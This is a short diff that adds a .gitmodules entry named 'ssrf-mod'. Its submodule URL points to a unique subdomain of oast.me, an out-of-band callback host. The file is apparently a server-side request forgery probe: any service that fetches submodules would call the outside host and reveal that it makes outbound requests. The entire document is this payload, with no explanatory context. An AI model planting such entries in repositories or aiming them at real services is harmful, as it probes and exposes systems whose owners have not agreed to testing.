@@ -1,0 +1,3 @@
+[submodule "ssrf-mod"]
+	path = ssrf-mod
+	url = http://d8mpfmci7huhit7fcavgyyze45nko5p6s.oast.me/git-submodule-058
